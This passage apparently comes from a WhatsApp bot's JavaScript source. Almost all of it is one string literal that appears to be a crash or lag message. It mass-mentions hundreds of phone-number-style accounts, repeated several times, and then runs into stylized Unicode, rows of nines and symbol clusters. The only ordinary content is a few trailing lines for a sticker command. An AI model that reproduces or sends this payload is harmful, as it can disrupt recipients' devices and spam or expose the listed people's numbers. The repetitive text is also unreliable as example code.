~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~`)
break   
      case "take":           
      case "colong":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        if (!isQuotedSticker) return replyv("Stiker aja om");
